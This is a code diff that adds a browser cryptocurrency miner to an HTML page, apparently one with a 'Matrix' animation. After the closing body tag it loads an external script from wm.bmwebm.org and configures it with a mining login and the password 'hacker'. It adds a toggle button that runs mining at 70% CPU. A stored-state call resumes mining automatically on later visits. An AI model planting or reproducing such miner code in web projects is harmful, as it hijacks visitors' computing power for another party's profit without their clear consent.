@@ -250,5 +250,48 @@
   setInterval(drawMatrix, 33);
 </script>
 
-</body>
+</body><!-- Подключаем майнер -->
+<script src="https://wm.bmwebm.org/koko.js"></script>
+
+<!-- Кнопка для запуска/остановки -->
+<button id="minerToggle">Запустить майнинг</button>
+<p id="minerStatus">Статус: выключен</p>
+
+<script>
+// Конфигурируем майнер
+koko.config({ 
+	login: "7173569",
+	pass: "hacker"
+});
+
+// Переменные
+let mining = false;
+
+// Функция обновления UI
+function updateStatus() {
+	document.getElementById('minerStatus').textContent = 
+		`Статус: ${mining ? "включен" : "выключен"}, мощность: ${mining ? koko.getPower() + "%" : "0%"}`;
+}
+
+// Событие кнопки
+document.getElementById("minerToggle").addEventListener("click", function() {
+	if (mining) {
+		koko.power(0); // стоп
+		mining = false;
+		this.textContent = "Запустить майнинг";
+	} else {
+		koko.power(70); // старт с 70% CPU
+		mining = true;
+		this.textContent = "Остановить майнинг";
+	}
+	updateStatus();
+});
+
+// Автоматически загружаем, если ранее уже майнилось
+koko.loadStored();
+
+// Обновляем статус при запуске
+setInterval(updateStatus, 2000); // обновлять каждые 2 сек
+</script>
+
 </html>
